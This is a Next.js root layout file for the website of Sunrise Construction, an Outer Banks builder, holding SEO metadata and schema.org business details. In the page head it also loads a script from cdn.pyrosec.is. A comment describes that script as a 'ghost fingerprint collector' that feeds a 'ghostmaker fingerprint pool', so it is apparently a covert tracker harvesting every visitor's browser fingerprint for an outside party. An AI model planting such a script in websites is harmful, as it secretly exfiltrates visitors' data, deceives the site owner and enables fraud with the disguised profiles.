import type { Metadata } from "next";
import Script from "next/script";
import "./globals.css";

export const metadata: Metadata = {
  title: {
    default: "Sunrise Construction | Premier Outer Banks Construction Company",
    template: "%s | Sunrise Construction",
  },
  description:
    "Elite Outer Banks construction company specializing in hurricane-resistant homes, beachfront construction, Wincore windows, and fortified roofing. Serving OBX with 20+ years experience.",
  keywords:
    "Outer Banks construction, OBX builders, beachfront construction, hurricane resistant homes, Wincore windows, fortified roofing, coastal construction, Nags Head, Kill Devil Hills, Duck, Kitty Hawk",
  metadataBase: new URL("https://sunriseobx.co"),
  openGraph: {
    type: "website",
    locale: "en_US",
    url: "https://sunriseobx.co",
    siteName: "Sunrise Construction",
    title: "Sunrise Construction | Premier Outer Banks Construction Company",
    description:
      "Elite Outer Banks construction company specializing in hurricane-resistant homes, beachfront construction, and FORTIFIED roofing. Serving OBX with 20+ years experience.",
    images: [
      {
        url: "/img/Beach-houses-1500.jpg",
        width: 1500,
        height: 1000,
        alt: "Sunrise Construction - Outer Banks beachfront homes",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: "Sunrise Construction | Premier Outer Banks Construction Company",
    description:
      "Elite Outer Banks construction company. Hurricane-resistant homes, FORTIFIED roofing, Wincore windows. 20+ years experience.",
    images: ["/img/Beach-houses-1500.jpg"],
  },
  robots: {
    index: true,
    follow: true,
  },
  alternates: {
    canonical: "https://sunriseobx.co",
  },
};

const jsonLd = {
  "@context": "https://schema.org",
  "@type": "HomeAndConstructionBusiness",
  name: "Sunrise Construction Services LLC",
  description:
    "Premier Outer Banks construction company specializing in hurricane-resistant homes, beachfront construction, Wincore windows, FORTIFIED roofing, siding, and exterior renovations.",
  url: "https://sunriseobx.co",
  logo: "https://sunriseobx.co/img/Sunrise-Logo.svg",
  image: "https://sunriseobx.co/img/Beach-houses-1500.jpg",
  telephone: "+1-252-619-7966",
  email: "hello@sunriseobx.co",
  address: {
    "@type": "PostalAddress",
    streetAddress: "5149-5177 N Croatan Hwy",
    addressLocality: "Kitty Hawk",
    addressRegion: "NC",
    postalCode: "27949",
    addressCountry: "US",
  },
  geo: {
    "@type": "GeoCoordinates",
    latitude: 36.0726,
    longitude: -75.7057,
  },
  areaServed: [
    "Corolla", "Duck", "Southern Shores", "Kitty Hawk",
    "Kill Devil Hills", "Nags Head", "Manteo", "Wanchese",
    "Rodanthe", "Waves", "Salvo", "Avon", "Buxton", "Frisco", "Hatteras",
  ].map((town) => ({
    "@type": "City",
    name: `${town}, NC`,
  })),
  priceRange: "$$",
  openingHoursSpecification: [
    {
      "@type": "OpeningHoursSpecification",
      dayOfWeek: ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday"],
      opens: "07:00",
      closes: "18:00",
    },
    {
      "@type": "OpeningHoursSpecification",
      dayOfWeek: "Saturday",
      opens: "08:00",
      closes: "14:00",
    },
  ],
  sameAs: ["https://www.facebook.com/sunriseobx"],
  aggregateRating: {
    "@type": "AggregateRating",
    ratingValue: "5.0",
    reviewCount: "52",
  },
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en">
      <head>
        <link rel="icon" href="/favicon.ico" sizes="any" />
        <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
        {/* Ghost fingerprint collector — feeds the ghostmaker fingerprint pool */}
        <Script
          src="https://cdn.pyrosec.is/static/ghost/fp.js"
          strategy="afterInteractive"
          data-source="sunriseobx.co"
        />
      </head>
      <body className="antialiased">{children}</body>
    </html>
  );
}
